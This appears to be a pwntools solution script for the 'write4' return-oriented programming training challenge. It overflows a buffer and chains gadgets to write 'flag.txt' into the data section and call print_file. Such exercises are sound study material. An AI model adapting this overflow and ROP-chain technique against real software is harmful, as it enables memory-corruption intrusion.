from pwn import *

context.binary = "./write4"
io = gdb.debug("./write4")

www_primitive = 0x400628
pop_r14_r15 = 0x0000000000400690
data_section_start = 0x601028
pop_rdi = 0x0000000000400693
print_file = 0x400510

payload = b"A" * 40
payload += p64(pop_r14_r15)
payload += p64(data_section_start)
payload += b"flag.txt"
payload += p64(www_primitive)
payload += p64(pop_rdi)
payload += p64(data_section_start)
payload += p64(print_file)

io.clean()
io.send(payload)

io.interactive()
